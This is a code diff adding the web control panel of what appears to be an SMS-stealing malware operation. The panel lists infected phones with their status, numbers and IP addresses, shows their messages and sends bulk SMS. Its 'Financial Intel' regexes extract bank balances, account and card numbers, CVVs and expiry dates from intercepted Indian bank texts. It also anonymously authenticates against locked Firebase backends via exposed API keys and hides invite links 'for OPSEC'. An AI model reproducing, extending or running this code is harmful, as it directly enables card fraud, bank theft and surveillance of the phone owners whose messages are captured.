+                    <div style="font-size: 1.2rem; font-weight: 700; color: var(--red); line-height: 1; font-family: var(--font-mono);" id="hOffline">0</div>
+                </div>
+                <div style="width: 1px; height: 30px; background: rgba(255,255,255,0.08);" class="db-hide-mobile"></div>
+                <div class="db-hide-mobile" style="display:flex; flex-direction:column; justify-content:center; gap: 6px; width: 140px;">
+                    <div style="display:flex; justify-content:space-between; align-items: flex-end; font-size: 0.65rem; color: var(--text-sec); letter-spacing: 1px; text-transform: uppercase; font-weight: 600;">
+                        <span>Uplink Ratio</span>
+                        <span id="hRatio" style="color:var(--cyan); font-weight:700; font-family: var(--font-mono); font-size: 0.75rem;">0%</span>
+                    </div>
+                    <div style="width:100%; height:6px; background:rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); border-radius:4px; overflow:hidden;">
+                        <div id="hProgressBar" style="width:0%; height:100%; background:var(--cyan); box-shadow:0 0 10px var(--cyan); transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1), background 0.5s, box-shadow 0.5s;"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="mobile-menu-toggle" onclick="document.querySelector('.topbar-right').classList.toggle('show')">☰</div>
+        <div class="topbar-right" style="display:flex;gap:12px">
+            <button class="btn" style="background:var(--bg-card); color:var(--amber); border-color:rgba(245,158,11,0.3); transition: var(--trans);" onmouseover="this.style.background='rgba(245,158,11,0.1)'; this.style.borderColor='var(--amber)'; this.style.boxShadow='0 0 10px rgba(245,158,11,0.1)'" onmouseout="this.style.background='var(--bg-card)'; this.style.borderColor='rgba(245,158,11,0.3)'; this.style.boxShadow='none'" onclick="openDupScanner()">🕵️ Scan Duplicates</button>
+            <button class="btn" style="background:var(--bg-card); color:var(--purple); border-color:var(--purple-dim); transition: var(--trans);" onmouseover="this.style.background='rgba(168,85,247,0.1)'; this.style.borderColor='var(--purple)'; this.style.boxShadow='0 0 10px rgba(168,85,247,0.1)'" onmouseout="this.style.background='var(--bg-card)'; this.style.borderColor='var(--purple-dim)'; this.style.boxShadow='none'" onclick="openBulkSms()">🚀 Bulk SMS</button>
+            <button class="btn" id="dbManagerBtn" style="background:var(--bg-card); transition: var(--trans); border-color: rgba(255,255,255,0.05);" onmouseover="this.style.background='rgba(255,255,255,0.05)'; this.style.borderColor='rgba(255,255,255,0.2)'" onmouseout="this.style.background='var(--bg-card)'; this.style.borderColor='rgba(255,255,255,0.05)'" onclick="openDbManager()">⚙️ Databases</button>
+            <button class="btn primary" onclick="fetchAll()">↻ Sync</button>
+            
+            <!-- PC Version: User Profile Dropdown -->
+            <div id="userProfileContainer" class="db-hide-mobile" style="position:relative; display:flex; align-items:center; margin-left: 8px;">
+                <button class="btn" id="userMenuBtn" style="background:var(--bg-card); color:var(--text-sec); border-color:rgba(255,255,255,0.05); padding: 8px; border-radius: 50%; display:flex; align-items:center; justify-content:center; width:36px; height:36px; transition:var(--trans);" onmouseover="this.style.background='rgba(255,255,255,0.05)'; this.style.color='#fff'" onmouseout="this.style.background='var(--bg-card)'; this.style.color='var(--text-sec)'" onclick="const d = document.getElementById('userDropdown'); d.style.display = d.style.display === 'flex' ? 'none' : 'flex';">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </button>
+                <div id="userDropdown" style="position:absolute; right:0; top:calc(100% + 8px); background:var(--bg-panel); border:1px solid rgba(255,255,255,0.1); border-radius:var(--radius-md); padding:8px; display:none; flex-direction:column; gap:4px; min-width: 180px; box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 1000;">
+                    <div style="padding: 4px 12px 8px; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 4px; font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 700;">Account Actions</div>
+                    <button class="btn" style="background:transparent; color:var(--text-sec); justify-content:flex-start; border:none; width:100%; font-weight:600; padding: 10px 12px;" onmouseover="this.style.background='rgba(239, 68, 68, 0.1)'; this.style.color='var(--red)'" onmouseout="this.style.background='transparent'; this.style.color='var(--text-sec)'" onclick="document.getElementById('userDropdown').style.display='none'; lockVault()">🚪 Logout</button>
+                    <button class="btn" style="background:transparent; color:var(--red); justify-content:flex-start; border:none; width:100%; font-weight:600; padding: 10px 12px;" onmouseover="this.style.background='rgba(239, 68, 68, 0.1)'" onmouseout="this.style.background='transparent'" onclick="document.getElementById('userDropdown').style.display='none'; destroyVault()">💣 Destroy Vault</button>
+                </div>
+            </div>
+            
+            <!-- Mobile Version: Native Menu Buttons -->
+            <button id="mobDestroyBtn" class="btn db-hide-pc" style="background:transparent; color:var(--red); border-color:var(--red); justify-content:center; margin-top: 8px;" onclick="destroyVault()">💣 Destroy Vault</button>
+            <button id="mobLogoutBtn" class="btn db-hide-pc" style="background:rgba(239, 68, 68, 0.1); color:var(--red); border-color:rgba(239, 68, 68, 0.3); justify-content:center;" onclick="lockVault()">🚪 Logout</button>
+        </div>
+    </header>
+
+    <main class="workspace">
+        <aside class="sidebar">
+            <div class="sidebar-head">
+                <div class="search-box" style="position: relative;">
+                    <input type="text" id="searchDev" placeholder="Search ID, Phone, Model..." oninput="filterDevs(); document.getElementById('clearSearchBtn').style.display = this.value ? 'block' : 'none';" style="padding-right: 36px;">
+                    <button id="clearSearchBtn" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: transparent; border: none; color: var(--text-muted); cursor: pointer; font-size: 1.4rem; display: none; line-height: 1; transition: color 0.2s;" onmouseover="this.style.color='#fff'" onmouseout="this.style.color='var(--text-muted)'" onclick="document.getElementById('searchDev').value=''; filterDevs(); this.style.display='none'; document.getElementById('searchDev').focus();">&times;</button>
+                </div>
+                <div class="filter-row">
+                    <button class="f-btn active" onclick="setF('status','all',this)">All</button>
+                    <button class="f-btn f-green" onclick="setF('status','online',this)">Online</button>
+                    <button class="f-btn f-red" onclick="setF('status','offline',this)">Offline</button>
+                    <button class="f-btn f-purple" onclick="setF('status','sms',this)">SMS</button>
+                </div>
+                <div class="filter-row" style="margin-bottom:8px">
+                    <div class="dd-wrapper" id="srcDdWrapper">
+                        <div class="dd-header" onclick="this.parentElement.classList.toggle('open')" id="srcDdHeader">All Sources</div>
+                        <div class="dd-list" id="srcDdList">
+                            <div class="dd-item" style="color:var(--text-main)" onclick="selectDd('all', 'All Sources', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--text-main);margin-right:10px;"></div>All Sources</div>
+                            <!-- Source options injected here -->
+                        </div>
+                    </div>
+                </div>
+                <div class="filter-row" style="margin-bottom:0" id="filterEditMain">
+                    <button class="f-btn active" onclick="setF('edit','all',this)">All Num</button>
+                    <button class="f-btn f-purple" onclick="setF('edit','edited',this)">Edited</button>
+                    <button class="f-btn f-amber" onclick="setF('edit','original',this)">Original</button>
+                </div>
+            </div>
+            <div class="list-header" id="devCount">DEVICES (0)</div>
+            <div class="device-list" id="devList"></div>
+            <div class="resizer" id="dragResizer"></div>
+        </aside>
+
+        <section class="content" id="mainContent">
+            <button id="mobileBackBtn" class="btn" style="display:none; margin: 16px 16px 8px; width: calc(100% - 32px); background: var(--bg-card); color: var(--text-sec); border-color: var(--border-light); justify-content: center; padding: 12px;" onclick="closeMobilePane()">
+                ← Back to Roster
+            </button>
+            <div class="tabs">
+                <button class="tab active" onclick="setTab('overview',this)">📊 Overview</button>
+                <button class="tab" onclick="setTab('device',this)">📱 Device Details</button>
+                <button class="tab" onclick="setTab('messages',this)">💬 Messages</button>
+                <button class="tab" onclick="setTab('finance',this)">💳 Financial Intel</button>
+                <button class="tab" onclick="setTab('sendsms',this)">📤 Send SMS</button>
+            </div>
+            <div class="pane animate-up" id="pane"></div>
+        </section>
+    </main>
+
+<script>
+// ═══ CONFIGURATION ═══
+let MASTER_KEY = localStorage.getItem('token') || '';
+let SOURCES = [];
+
+// ═══ FINANCIAL INTELLIGENCE REGEX ENGINE (PORTED FROM PROFEX) ═══
+const BANK_NAMES = [
+    [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"],
+    [/SBIIN|SBIINB|SBI/i, "SBI"],
+    [/ICICIB|ICICI/i, "ICICI Bank"],
+    [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"],
+    [/KOTAKB|KOTAK/i, "Kotak Bank"],
+    [/PNBSMS|PNB/i, "PNB"],
+    [/BOIIND|BOI/i, "Bank of India"],
+    [/CANBNK|CANARA/i, "Canara Bank"],
+    [/UNIONB|UBISMS/i, "Union Bank"],
+    [/YESBNK|YESBANK/i, "Yes Bank"],
+    [/IDBIBK|IDBI/i, "IDBI Bank"],
+    [/INDUSB|INDUSIND/i, "IndusInd Bank"],
+    [/FEDERAL|FEDBNK/i, "Federal Bank"],
+    [/RBLBNK|RBL/i, "RBL Bank"],
+    [/BAJAJFIN/i, "Bajaj Finance"],
+    [/CRED/i, "CRED"]
+];
+
+const BAL_REGEX = [
+    /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+    /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+    /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
+    /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
+    /Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
+    /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+    /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+    /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
+    /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
+];
+
+const TXN_REGEX = [
+    /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+    /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
+    /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
+    /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
+];
+
+const ACC_REGEX = [
+    /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
+    /[xX*]{4,}([0-9]{4})/,
+    /ending\s+(?:with\s+)?([0-9]{4})/i
+];
+
+const CARD_REGEX = [
+    /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
+    /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i
+];
+
+const CVV_REGEX = [
+    /CVV[\s:]+([0-9]{3,4})/i,
+    /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i
+];
+
+const EXP_REGEX = [
+    /(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i,
+    /([0-9]{1,2})\/([0-9]{2,4})\s+(?:expiry|exp)/i
+];
+// Show password prompt immediately if no key
+const urlParams = new URLSearchParams(window.location.search);
+const inviteCode = urlParams.get('nexus_invite');
+
+if (inviteCode) {
+    // Decode the invite and boot directly — skip vault decryption entirely
+    try {
+        const decoded = decodeURIComponent(escape(atob(inviteCode)));
+        const parts = decoded.split('|||');
+        const label = parts[0], base = parts[1], apiKey = parts[2] || '';
+        
+        if (label && base) {
+            // Generate a key from the label (lowercase, no spaces)
+            const safeKey = label.toLowerCase().replace(/[^a-z0-9]/g, '');
+            SOURCES = [{
+                key: safeKey,
+                label: label,
+                base: base,
+                apiKey: apiKey,
+                color: 'var(--cyan)'
+            }];
+            
+            // Set a dummy volatile key — NOT saved to localStorage
+            MASTER_KEY = 'INVITE_SESSION'; 
+            
+            // Strip the invite code from the URL for OPSEC
+            window.history.replaceState({}, document.title, window.location.pathname);
+            
+            // Defer the actual boot until after the entire <script> block has been parsed
+            // (renderDbSidebarFilters, fetchAll etc. are defined later in this same script)
+            setTimeout(() => {
+                document.getElementById('loader').classList.add('hidden');
+                
+                // Hide sensitive Master Controls during temporary session
+                const dbBtn = document.getElementById('dbManagerBtn');
+                const profileBtn = document.getElementById('userProfileContainer');
+                const mobDestBtn = document.getElementById('mobDestroyBtn');
+                const mobLogBtn = document.getElementById('mobLogoutBtn');
+                const filterMain = document.getElementById('filterEditMain');
+                const filterBulk = document.getElementById('filterEditBulk');
+                
+                if (dbBtn) dbBtn.style.display = 'none';
+                if (profileBtn) profileBtn.style.display = 'none';
+                if (mobDestBtn) mobDestBtn.style.display = 'none';
+                if (mobLogBtn) mobLogBtn.style.display = 'none';
+                if (filterMain) filterMain.style.display = 'none';
+                if (filterBulk) filterBulk.style.display = 'none';
+                
+                renderDbSidebarFilters();
+                fetchAll();
+                customAlert('Invite Accepted', `Securely connected to <b>${label}</b>. This is a temporary session — it will not be saved to your vault.`);
+            }, 0);
+        } else {
+            throw new Error("Invalid invite format");
+        }
+    } catch (e) {
+        console.error("Invite parsing failed", e);
+        if (!MASTER_KEY) {
+            document.getElementById('pwdModal').classList.add('active');
+        } else {
+            bootNexus();
+        }
+    }
+} else if (!MASTER_KEY) {
+    document.getElementById('pwdModal').classList.add('active');
+} else {
+    bootNexus();
+}
+
+async function unlockVault() {
+    const user = document.getElementById('loginUsername').value.trim();
+    const pwd = document.getElementById('masterPwd').value.trim();
+    if (!user || !pwd) return;
+    
+    document.getElementById('loginBtn').textContent = 'Authenticating...';
+    
+    try {
+        const res = await fetch('/api/auth/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: user, password: pwd })
+        });
+        const data = await res.json();
+        
+        if (data.success) {
+            MASTER_KEY = data.token;
+            localStorage.setItem('token', MASTER_KEY);
+            
+            // Set permissions globally
+            window.CURRENT_ROLE = data.role;
+            window.CAN_EDIT_PHONE = data.permissions.canEditPhone;
+            window.CAN_VIEW_TELECOM = data.permissions.canViewTelecomIntel;
+            
+            document.getElementById('pwdModal').classList.remove('active');
+            bootNexus();
+        } else {
+            document.getElementById('loginError').style.display = 'block';
+            document.getElementById('loginError').textContent = data.message;
+            document.getElementById('loginBtn').textContent = 'Authenticate';
+        }
+    } catch(e) {
+        document.getElementById('loginError').style.display = 'block';
+        document.getElementById('loginError').textContent = 'Network Error';
+        document.getElementById('loginBtn').textContent = 'Authenticate';
+    }
+}
+
+function lockVault() {
+    customConfirm("Logout", "Are you sure you want to securely log out of the Nexus panel?", () => {
+        localStorage.removeItem('token');
+        location.reload();
+    });
+}
+
+async function bootNexus() {
+    document.getElementById('loader').classList.remove('hidden');
+    document.getElementById('loadText').textContent = 'Authenticating Uplink...';
+    document.getElementById('loadSubtext').textContent = 'Connecting to Proxy Backend';
+    
+    try {
+        // Fetch identity to restore permissions on page reload if token exists
+        if (!window.CURRENT_ROLE) {
+            const res = await fetch('/api/auth/me', {
+                headers: { 'Authorization': `Bearer ${MASTER_KEY}` }
+            });
+            const data = await res.json();
+            if (data.success) {
+                window.CURRENT_ROLE = data.role;
+                window.CAN_EDIT_PHONE = data.permissions.canEditPhone;
+                window.CAN_VIEW_TELECOM = data.permissions.canViewTelecomIntel;
+            } else {
+                localStorage.removeItem('token');
+                location.reload();
+                return;
+            }
+        }
+        
+        // Hide Admin tabs if standard user
+        if (window.CURRENT_ROLE !== 'admin') {
+            const dbBtn = document.getElementById('dbManagerBtn');
+            if (dbBtn) dbBtn.style.display = 'none';
+        }
+
+        renderDbSidebarFilters();
+        await fetchAll();
+        startDataIntervals();
+        
+        document.getElementById('loader').classList.add('hidden');
+    } catch (e) {
+        console.error("Boot Error:", e);
+        customAlert('Uplink Failed', 'Could not establish connection to the Middleman API.');
+        document.getElementById('loader').classList.add('hidden');
+    }
+}
+
+function renderDbSidebarFilters() {
+    const filterHtml = SOURCES.map(s => {
+        const c = s.color || 'var(--cyan)';
+        return `<div class="dd-item" style="color:${c}" onclick="selectDd('${s.key}', '${s.label}', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${c};box-shadow:0 0 8px ${c};margin-right:10px;"></div>${s.label}</div>`;
+    }).join('');
+    const srcDdList = document.getElementById('srcDdList');
+    if (srcDdList) {
+        srcDdList.innerHTML = `<div class="dd-item" style="color:var(--text-main)" onclick="selectDd('all', 'All Sources', 'src', this)"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--text-main);margin-right:10px;"></div>All Sources</div>` + filterHtml;
+        // Keep current selection visually if possible
+        if (fSrc && fSrc !== 'all') {
+            const s = SOURCES.find(x => x.key === fSrc);
+            if (s) {
+                const c = s.color || 'var(--cyan)';
+                document.getElementById('srcDdHeader').innerHTML = `<span style="color:${c};display:flex;align-items:center;"><div style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${c};box-shadow:0 0 8px ${c};margin-right:8px;"></div>${s.label}</span>`;
+            }
+            else { fSrc = 'all'; document.getElementById('srcDdHeader').textContent = 'All Sources'; }
+        } else {
+            document.getElementById('srcDdHeader').textContent = 'All Sources';
+        }
+    }
+}
+
+
+
+let devices = [], filtered = [], selDev = null, cache = {};
+let fStat = 'all', fSrc = 'all', fEdit = 'all', curTab = 'overview', selSim = 1, mf = 'all';
+let CAN_EDIT_PHONE = false;
+const _authTokenCache = {};
+
+// Anonymously authenticate against a locked Firebase using its Web API Key
+async function getAuthToken(src) {
+    if (!src.apiKey) return null;
+    // Return cached token if still fresh (Firebase tokens last ~1hr, we cache 50min)
+    const cached = _authTokenCache[src.key];
+    if (cached && Date.now() < cached.exp) return cached.token;
+    
+    try {
+        const res = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${src.apiKey}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ returnSecureToken: true })
+        });
+        if (!res.ok) return null;
+        const data = await res.json();
+        if (data.idToken) {
+            _authTokenCache[src.key] = { token: data.idToken, exp: Date.now() + 50 * 60 * 1000 };
+            return data.idToken;
+        }
+    } catch(e) { console.warn(`[AUTH] Failed for ${src.key}:`, e); }
+    return null;
+}
+
+async function fetchAll(isBg = false) {
+    const l = document.getElementById('loader');
+    if (!isBg) {
+        document.getElementById('devList').innerHTML = renderSkeletons();
+        document.getElementById('devCount').textContent = 'DEVICES (···)';
+        
+        document.getElementById('hTotal').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
+        document.getElementById('hOnline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
+        document.getElementById('hOffline').innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:16px;border-radius:4px;"></span>';
+        const ratioEl = document.getElementById('hRatio');
+        if(ratioEl) ratioEl.innerHTML = '<span class="skel-block" style="display:inline-block;width:24px;height:10px;border-radius:4px;"></span>';
+        const barEl = document.getElementById('hProgressBar');
+        if(barEl) { barEl.style.width = '100%'; barEl.style.background = 'rgba(255,255,255,0.05)'; barEl.style.boxShadow = 'none'; }
+        
+        if (curTab === 'overview') {
+            document.getElementById('pane').innerHTML = renderMainSkeletons();
+        }
+    }
+    
+    let newDevices = [];
+
+    try {
+        const res = await fetch('/api/devices', {
+            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
+        });
+        if (res.ok) {
+            const result = await res.json();
+            if (result.success) {
+                for (const info of result.data) {
+                    const id = info._id;
+                    const srcKey = info._src;
+                    
+                    if (isBg) {
+                        let existing = devices.find(d => d._id === id && d._src === srcKey);
+                        if (existing) {
+                            existing.status = info.status;
+                            existing.battery = info.battery;
+                            existing.webhookEvent = info.webhookEvent;
+                            
+                            const card = document.getElementById(`card-${srcKey}-${id}`);
+                            if (card) {
+                                const dot = card.querySelector('.d-status');
+                                if (dot) dot.className = `d-status ${existing.status?'on':'off'}`;
+                                const batt = card.querySelector('.d-batt');
+                                if (batt) {
+                                    const bnum = parseInt(existing.battery)||0;
+                                    batt.style.color = bnum>50?'var(--green)':bnum>20?'var(--amber)':'var(--red)';
+                                    batt.textContent = existing.battery||'—';
+                                }
+                            }
+                            if (selDev && selDev._id === existing._id && selDev._src === existing._src) {
+                                const root = document.documentElement;
+                                if (existing.status) {
+                                    root.style.setProperty('--accent', 'var(--cyan)');
+                                    root.style.setProperty('--accent-dim', 'var(--cyan-dim)');
+                                    root.style.setProperty('--accent-glow', '0 0 20px rgba(0, 240, 255, 0.4)');
+                                } else {
+                                    root.style.setProperty('--accent', 'var(--red)');
+                                    root.style.setProperty('--accent-dim', 'var(--red-dim)');
+                                    root.style.setProperty('--accent-glow', '0 0 20px rgba(239, 68, 68, 0.4)');
+                                }
+                                
+                                if (curTab === 'device') {
+                                    const dDot = document.getElementById('det-status-dot');
+                                    if (dDot) {
+                                        dDot.className = `d-status ${existing.status ? 'on' : 'off'}`;
+                                        dDot.title = existing.status ? 'Online' : 'Offline';
+                                    }
+                                    const dText = document.getElementById('det-status-text');
+                                    if (dText) {
+                                        dText.className = `d-val ${existing.status ? 'v-green' : 'v-red'}`;
+                                        dText.textContent = existing.status ? 'Online' : 'Offline';
+                                    }
+                                    const dBatt = document.getElementById('det-battery');
+                                    if (dBatt) {
+                                        dBatt.textContent = existing.battery || '—';
+                                    }
+                                }
+                            }
+                        } else {
+                            devices.push(info);
+                        }
+                    } else {
+                        newDevices.push(info);
+                    }
+                }
+            }
+        }
+    } catch(e) {
+        console.error("API fetch error:", e);
+    }
+    
+    if (!isBg) {
+        devices = newDevices;
+        devices.sort((a,b) => (b.status?1:0) - (a.status?1:0));
+        updateStats();
+        filterDevs();
+        renderTab();
+        l.classList.add('hidden');
+    } else {
+        updateStats(); // Only update the topbar stats silently
+        if (curTab === 'overview') renderTab(true); // Keep overview stats live during bg fetch (silently)
+    }
+}
+
+function updateStats() {
+    const total = devices.length;
+    const on = devices.filter(d=>d.status).length;
+    const off = total - on;
+    const ratio = total === 0 ? 0 : Math.round((on / total) * 100);
+    
+    document.getElementById('hTotal').textContent = total;
+    document.getElementById('hOnline').textContent = on;
+    document.getElementById('hOffline').textContent = off;
+    
+    const ratioEl = document.getElementById('hRatio');
+    if(ratioEl) ratioEl.textContent = ratio + '%';
+    const barEl = document.getElementById('hProgressBar');
+    if(barEl) {
+        barEl.style.width = ratio + '%';
+        if (ratio < 30 && total > 0) {
+            barEl.style.background = 'var(--red)';
+            barEl.style.boxShadow = '0 0 10px var(--red)';
+            if(ratioEl) ratioEl.style.color = 'var(--red)';
+        } else if (ratio < 70 && total > 0) {
+            barEl.style.background = 'var(--amber)';
+            barEl.style.boxShadow = '0 0 10px var(--amber)';
+            if(ratioEl) ratioEl.style.color = 'var(--amber)';
+        } else {
+            barEl.style.background = 'var(--cyan)';
+            barEl.style.boxShadow = '0 0 10px var(--cyan)';
+            if(ratioEl) ratioEl.style.color = 'var(--cyan)';
+        }
+    }
+}
+
+function setF(type, val, btn) {
+    if(type==='status') fStat = val; 
+    else if(type==='src') fSrc = val;
+    else if(type==='edit') fEdit = val;
+    
+    if (btn) {
+        btn.parentElement.querySelectorAll('.f-btn').forEach(b=>b.classList.remove('active'));
+        btn.classList.add('active');
+    }
+    filterDevs();
+}
+
+function filterDevs() {
+    const q = (document.getElementById('searchDev').value||'').toLowerCase();
+    filtered = devices.filter(d => {
+        if(fSrc !== 'all' && d._src !== fSrc) return false;
+        if(fStat === 'online' && !d.status) return false;
+        if(fStat === 'offline' && d.status) return false;
+        if(fStat === 'sms' && !d.webhookEvent?.sendSms) return false;
+        if(fEdit === 'edited' && !d.customPh) return false;
+        if(fEdit === 'original' && d.customPh) return false;
+        if(q) {
+            let p = d.sims?.map(s=>s?.phoneNumber).join(' ')||'';
+            let str = `${d._id} ${d.customPh||''} ${d.mobNo||''} ${d.modelName||''} ${d.ip_address||''} ${p}`.toLowerCase();
+            if(!str.includes(q)) return false;
+        }
+        return true;
+    });
+    document.getElementById('devCount').textContent = `DEVICES (${filtered.length})`;
+    renderDevList();
+}
+
+function renderSkeletons() {
+    let html = '';
+    for(let i=0; i<6; i++) {
+        html += `
+        <div style="padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.03); display: flex; align-items: center; gap: 14px;">
+            <div class="skel-block" style="width:36px; height:36px; border-radius:8px;"></div>
+            <div style="flex:1;">
+                <div class="skel-block" style="width:60%; height:14px; border-radius:4px; margin-bottom:8px;"></div>
+                <div class="skel-block" style="width:40%; height:10px; border-radius:4px;"></div>
+            </div>
+            <div>
+                <div class="skel-block" style="width:30px; height:14px; border-radius:4px; margin-bottom:8px; margin-left:auto;"></div>
+                <div class="skel-block" style="width:20px; height:20px; border-radius:4px; margin-left:auto;"></div>
+            </div>
+        </div>`;
+    }
+    return html;
+}
+
+function renderMainSkeletons() {
+    return `
+    <div class="stats-grid">
+        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
+            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
+            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
+        </div>
+        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
+            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
+            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
+        </div>
+        <div class="stat-card" style="border-color: rgba(255,255,255,0.05); min-height: 110px;">
+            <div class="skel-block" style="width: 40%; height: 12px; margin-bottom: 12px; border-radius: 4px;"></div>
+            <div class="skel-block" style="width: 60%; height: 40px; border-radius: 6px;"></div>
+        </div>
+    </div>
+    <div style="margin-top: 48px;">
+        <div class="skel-block" style="width: 200px; height: 24px; margin-bottom: 24px; border-radius: 4px;"></div>
+        <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 16px;">
+            ${Array(6).fill(0).map(() => `
+            <div class="hub-card" style="border-color: rgba(255,255,255,0.05); pointer-events: none; min-height: 80px;">
+                <div style="display: flex; flex-direction: column; gap: 6px; flex: 1.2;">
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <div class="skel-block" style="width: 12px; height: 12px; border-radius: 50%;"></div>
+                        <div class="skel-block" style="width: 80px; height: 18px; border-radius: 4px;"></div>
+                    </div>
+                    <div class="skel-block" style="width: 120px; height: 10px; border-radius: 4px;"></div>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 20px; border-left: 1px solid rgba(255,255,255,0.05); border-right: 1px solid rgba(255,255,255,0.05); min-width: 90px;">
+                    <div class="skel-block" style="width: 50px; height: 24px; border-radius: 4px; margin-bottom: 6px;"></div>
+                    <div class="skel-block" style="width: 60px; height: 8px; border-radius: 4px;"></div>
+                </div>
+                <div style="display: flex; flex-direction: column; justify-content: center; gap: 8px; flex: 1; padding-left: 8px;">
+                    <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                        <div class="skel-block" style="width: 40px; height: 10px; border-radius: 4px;"></div>
+                        <div class="skel-block" style="width: 24px; height: 16px; border-radius: 4px;"></div>
+                    </div>
+                    <div class="skel-block" style="width: 100%; height: 4px; border-radius: 2px;"></div>
+                </div>
+            </div>`).join('')}
+        </div>
+    </div>`;
+}
+
+function renderDevList() {
+    // Dynamic Threat Level Color Shift
+    const root = document.documentElement;
+    if (!selDev || selDev.status) {
+        root.style.setProperty('--accent', 'var(--cyan)');
+        root.style.setProperty('--accent-dim', 'var(--cyan-dim)');
+        root.style.setProperty('--accent-glow', '0 0 20px rgba(0, 240, 255, 0.4)');
+    } else {
+        root.style.setProperty('--accent', 'var(--red)');
+        root.style.setProperty('--accent-dim', 'var(--red-dim)');
+        root.style.setProperty('--accent-glow', '0 0 20px rgba(239, 68, 68, 0.4)');
+    }
+
+    const html = filtered.map((d, index) => {
+        const ph = d.customPh || d.mobNo || d.sims?.[0]?.phoneNumber || 'Unknown';
+        const act = selDev && selDev._id === d._id && selDev._src === d._src ? 'active' : '';
+        const bnum = parseInt(d.battery)||0;
+        const bcol = bnum>50?'var(--green)':bnum>20?'var(--amber)':'var(--red)';
+        
+        const sData = SOURCES.find(s => s.key === d._src);
+        const scol = sData ? sData.color : 'var(--cyan)';
+        
+        return `
+        <div class="device-card ${act}" id="card-${d._src}-${d._id}" onclick="select('${d._src}','${d._id}')" oncontextmenu="showContextMenu(event, '${d._src}', '${d._id}')">
+            <div class="d-icon">📱<div class="d-status ${d.status?'on':'off'}"></div></div>
+            <div class="d-info">
+                <div class="d-id">${esc(d._id)}</div>
+                <div class="d-sub">
+                    <span id="ph-${d._id}">${esc(ph)}</span>
+                    ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
